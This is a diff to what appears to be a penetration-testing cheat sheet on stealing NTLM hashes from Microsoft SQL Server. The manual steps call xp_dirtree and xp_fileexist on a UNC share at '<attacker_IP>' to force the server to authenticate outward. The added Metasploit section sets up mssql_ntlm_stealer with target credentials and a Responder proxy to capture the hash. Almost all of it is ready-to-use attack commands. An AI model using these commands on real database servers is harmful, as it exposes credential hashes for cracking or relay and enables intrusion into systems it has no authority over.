@@ -18,6 +18,8 @@ DROP TABLE test_table;
 
 ## 2.3 - MSSQL
 
+### 2.3.1 - Manual
+
 ```
 1> xp_dirtree '\\<attacker_IP>\snare\'
 2> go
@@ -30,6 +32,28 @@ DROP TABLE test_table;
 
 1> EXEC master.dbo.xp_fileexist '\\<attacker_IP>\snare\'
 2> go
+```
+
+### 2.3.2 - Metasploit
+
+```
+msf > use auxiliary/admin/mssql/mssql_ntlm_stealer
+
+msf auxiliary(admin/mssql/mssql_ntlm_stealer) > set rhosts <target_IP>
+
+msf auxiliary(admin/mssql/mssql_ntlm_stealer) > set username <username>
+
+msf auxiliary(admin/mssql/mssql_ntlm_stealer) > set password <password>
+```
+
+If we use Windows credential, set as below:
+
+```
+msf auxiliary(admin/mssql/mssql_ntlm_stealer) > set use_windows_authent true
+
+msf auxiliary(admin/mssql/mssql_ntlm_stealer) > set smbproxy <responder_ip>
+
+msf auxiliary(admin/mssql/mssql_ntlm_stealer) > run
 ```
 
 Capture hash
